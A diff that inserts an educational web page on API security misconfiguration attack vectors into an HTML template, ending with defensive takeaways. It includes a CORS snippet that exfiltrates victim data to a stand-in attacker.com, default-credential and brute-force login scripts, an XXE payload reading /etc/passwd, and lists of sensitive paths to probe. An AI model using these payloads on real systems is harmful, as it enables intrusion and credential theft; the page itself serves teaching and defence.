@@ -215,7 +215,266 @@
         </a>
         
         <div class="content">
-{CONTENT}
+            <h1>API08: Security Misconfiguration - Attack Vectors</h1>
+
+<h2>CORS Misconfiguration Exploitation</h2>
+
+<h3>Attack: Steal Credentials via CORS</h3>
+
+<p>``<code>javascript</p>
+<p>// Attacker's website (evil.com)</p>
+<p>fetch('https://api.victim.com/user/profile', {</p>
+<p>    credentials: 'include'  // Include cookies</p>
+<p>}).then(r => r.json()).then(data => {</p>
+<p>    // Exfiltrate to attacker</p>
+<p>    fetch('https://attacker.com/log', {method: 'POST', body: JSON.stringify(data)});</p>
+<p>});</p>
+</code>`<code>
+
+<strong>Works when API has</strong>:
+</code>`<code>
+<p>Access-Control-Allow-Origin: *</p>
+<p>Access-Control-Allow-Credentials: true</p>
+</code>`<code>
+
+<h2>Information Disclosure via Verbose Errors</h2>
+
+<h3>Stack Trace Exposure</h3>
+
+<strong>Request</strong>:
+</code>`<code>http
+<p>GET /api/users/INVALID_ID</p>
+</code>`<code>
+
+<strong>Vulnerable Response</strong>:
+</code>`<code>json
+<p>{</p>
+<p>  "error": "Traceback:\n  File '/app/views.py', line 42\n    user = User.query.get(user_id)\nSQLAlchemy Error: Invalid input\nDatabase: postgresql://admin:P@ssw0rd@db.internal:5432/production\nConfig: /etc/app/config.json"</p>
+<p>}</p>
+</code>`<code>
+
+<strong>Leaked Information</strong>:
+<ul>
+<li>File paths</li>
+<li>Database credentials</li>
+<li>Internal hostnames</li>
+<li>Framework versions</li>
+<li>Config file locations</li>
+</ul>
+
+<h2>Debug Endpoint Exploitation</h2>
+
+<h3>Common Debug Endpoints</h3>
+
+</code>`<code>
+<p>GET /_debug</p>
+<p>GET /_internal/metrics</p>
+<p>GET /api/health</p>
+<p>GET /actuator/env (Spring Boot)</p>
+<p>GET /debug/pprof (Go)</p>
+<p>GET /.env</p>
+</code>`<code>
+
+<strong>Example Response</strong>:
+</code>`<code>json
+<p>{</p>
+<p>  "environment": "production",</p>
+<p>  "database": {</p>
+<p>    "host": "prod-db.internal",</p>
+<p>    "user": "admin",</p>
+<p>    "password": "Sup3rS3cr3t!"</p>
+<p>  },</p>
+<p>  "aws_key": "AKIAIOSFODNN7EXAMPLE",</p>
+<p>  "jwt_secret": "my-secret-key-123"</p>
+<p>}</p>
+</code>`<code>
+
+<h2>Default Credentials</h2>
+
+<h3>Common Defaults</h3>
+
+</code>`<code>
+<p>admin/admin</p>
+<p>root/root</p>
+<p>administrator/password</p>
+<p>api/api</p>
+<p>default/default</p>
+</code>`<code>
+
+<h3>Testing Script</h3>
+
+</code>`<code>python
+<p>import requests</p>
+
+<p>default_creds = [</p>
+<p>    ('admin', 'admin'),</p>
+<p>    ('root', 'root'),</p>
+<p>    ('administrator', 'password')</p>
+<p>]</p>
+
+<p>for username, password in default_creds:</p>
+<p>    r = requests.post('https://api.target.com/login', </p>
+<p>                      json={'username': username, 'password': password})</p>
+<p>    if r.status_code == 200:</p>
+<p>        print(f"SUCCESS: {username}/{password}")</p>
+</code>`<code>
+
+<h2>Missing Security Headers Exploitation</h2>
+
+<h3>Clickjacking</h3>
+
+<strong>Missing</strong>: </code>X-Frame-Options<code> or </code>Content-Security-Policy<code>
+
+</code>`<code>html
+<!-- Attacker's page -->
+<iframe src="https://api.victim.com/transfer-money"></iframe>
+<!-- Trick user into clicking inside iframe -->
+</code>`<code>
+
+<h3>MIME Sniffing XSS</h3>
+
+<strong>Missing</strong>: </code>X-Content-Type-Options: nosniff<code>
+
+</code>`<code>
+<p>Upload file: evil.jpg (actually contains <script>)</p>
+<p>Browser sniffs content, executes JavaScript</p>
+</code>`<code>
+
+<h2>HTTP Security Headers Attacks</h2>
+
+<h3>Missing HSTS</h3>
+
+<strong>Attack</strong>: Strip HTTPS via MITM
+</code>`<code>
+<p>https://api.com → http://api.com (downgrade)</p>
+</code>`<code>
+
+<h3>Missing CSP</h3>
+
+<strong>Attack</strong>: Inject inline scripts
+</code>`<code>html
+<script>steal_data()</script>
+</code>`<code>
+
+<h2>Configuration File Exposure</h2>
+
+<h3>Accessible Files</h3>
+
+</code>`<code>
+<p>GET /.env</p>
+<p>GET /config.json</p>
+<p>GET /application.properties</p>
+<p>GET /web.config</p>
+<p>GET /.git/config</p>
+<p>GET /swagger.json (may contain credentials)</p>
+</code>`<code>
+
+<h2>Unnecessary HTTP Methods</h2>
+
+</code>`<code>http
+<p>OPTIONS /api/users</p>
+<p>→ Allow: GET, POST, PUT, DELETE, TRACE, CONNECT</p>
+
+<p>TRACE /api/users</p>
+<p>→ Echoes request (can steal HttpOnly cookies)</p>
+</code>`<code>
+
+<h2>Directory Listing</h2>
+
+</code>`<code>
+<p>GET /api/</p>
+<p>→ Shows all endpoints</p>
+<p>GET /uploads/</p>
+<p>→ Lists all uploaded files</p>
+</code>`<code>
+
+<h2>XML External Entity (XXE) via Misconfigured Parser</h2>
+
+</code>`<code>xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<user><name>&xxe;</name></user>
+</code>`<code>
+
+<h2>Server Version Disclosure</h2>
+
+</code>`<code>http
+<p>Response Headers:</p>
+<p>Server: Apache/2.4.49 (Ubuntu)</p>
+<p>X-Powered-By: PHP/7.2.34</p>
+<p>X-AspNet-Version: 4.0.30319</p>
+</code>`<code>
+
+<strong>Risk</strong>: Known vulnerabilities for specific versions
+
+<h2>Insecure SSL/TLS Configuration</h2>
+
+</code>`<code>
+<p>Accepts SSL v3 (POODLE)</p>
+<p>Weak ciphers (RC4, DES)</p>
+<p>No perfect forward secrecy</p>
+</code>`<code>
+
+<h2>Admin Interface Exposure</h2>
+
+</code>`<code>
+<p>GET /admin</p>
+<p>GET /phpmyadmin</p>
+<p>GET /api/admin</p>
+<p>GET /management</p>
+</code>`<code>
+
+<strong>Often</strong>: No authentication, or default credentials
+
+<h2>Open Swagger/OpenAPI Documentation</h2>
+
+</code>`<code>
+<p>GET /swagger-ui</p>
+<p>GET /api-docs</p>
+<p>GET /openapi.json</p>
+</code>`<code>
+
+<strong>Risk</strong>: Complete API documentation for attackers
+
+<h2>Backup Files</h2>
+
+</code>`<code>
+<p>GET /api.php.bak</p>
+<p>GET /config.json.old</p>
+<p>GET /.git</p>
+<p>GET /db_backup.sql</p>
+</code>`<code>
+
+<h2>Session Configuration Issues</h2>
+
+</code>`<code>
+<p>Cookie without Secure flag (sent over HTTP)</p>
+<p>Cookie without HttpOnly (accessible to JavaScript)</p>
+<p>Cookie without SameSite (CSRF vulnerable)</p>
+<p>Long session timeout (24+ hours)</p>
+</code>`<code>
+
+<h2>Rate Limiting Absence</h2>
+
+</code>`<code>python
+<h1>Try 1000 login attempts</h1>
+<p>for i in range(1000):</p>
+<p>    requests.post('/api/login', json={'user': 'admin', 'pass': f'pass{i}'})</p>
+<p>    # No rate limiting, brute force succeeds</p>
+</code>``
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>CORS </strong>*: Never allow all origins with credentials</li>
+<li><strong>Verbose errors</strong>: Hide stack traces in production</li>
+<li><strong>Debug endpoints</strong>: Remove before deployment</li>
+<li><strong>Default credentials</strong>: Always change</li>
+<li><strong>Security headers</strong>: Implement all</li>
+<li><strong>Configuration files</strong>: Never expose</li>
+<li><strong>Regular audits</strong>: Scan for misconfigurations</li>
+</ol>
+
         </div>
     </div>
 </body>
